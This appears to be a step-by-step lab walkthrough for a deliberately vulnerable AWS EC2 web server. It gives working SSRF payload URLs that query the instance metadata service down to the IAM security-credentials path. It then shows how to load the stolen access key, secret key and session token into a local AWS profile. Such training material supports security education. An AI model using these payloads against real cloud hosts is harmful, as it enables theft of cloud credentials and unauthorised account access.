1.  From the console, locate the ec2 instance that was provisioned.

2.  In a seperate browser window, navigate to the public IP address of the ec2 instance.  

You can find the public IP by clicking on the instance, and going to `Details`, then `Public IPv4 address`.

<b> ** Make sure that you change the url to use http, as that is how we have configured our security group. ** </b>


```script 
 http://<public_ipv4_address>/
```

We can see that the web server is running, but it looks like it's expecting a query string.  We need to construct an SSRF payload.

3.  First, let's look at some of the metadata categories available:

```script
 http://<public_ip>/?url=http://169.254.169.254/latest/meta-data/
```

These are all categories of information that the ec2 instance would be able to access during it's day to day actions.

4.  By navigating through the API structure, we can eventually get to credentials.  Paste each url into your browser to work through the API directory structure.  

<b> Variables Required </b>  
{Instance-Profile} - The instance profile name will be unique to each environment.  You can find this by iterating through 

```script
 http://<public_ip>/?url=http://169.254.169.254/latest/meta-data/iam/
 http://<public_ip>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials
 http://<public_ip>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/{Instance-Profile}
```

5.  These are the credentials of the instance profile that is being used by the ec2 instance.  By making a profile using these credentials, we will be able to execute AWS API calls using the identity of the ec2 instance instance profile.  

Copy the value of `AccessKeyId`, `SecretAccessKey` and `Token`, and use it to configure a profile called `ssrf-demo`.  

In order to do this, open your aws credential file in a text editor.

By default, credential files are stored in the following places:   
    - Windows: `C:\Users\username\.aws\credentials`  
    - Linux: `~/.aws/credentials`

Create a new entry called `ssrf-demo`.

<b> Variables Required </b>  
- {AccessKeyId} - The Access key as found in the browser window.
- {SecretAccessKey} - The Secret Access key, as shown in the browser
- {Token} - The Token value, as shown in the browser

```script
    [ssrf-demo]
    aws_access_key_id = ${AccessKeyId}
    aws_secret_access_key = ${SecretAccessKey}
    aws_session_token = ${Token}
```